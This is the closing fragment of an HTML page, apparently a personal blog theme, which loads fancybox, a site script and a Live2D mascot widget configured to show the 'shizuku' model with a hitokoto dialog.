<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>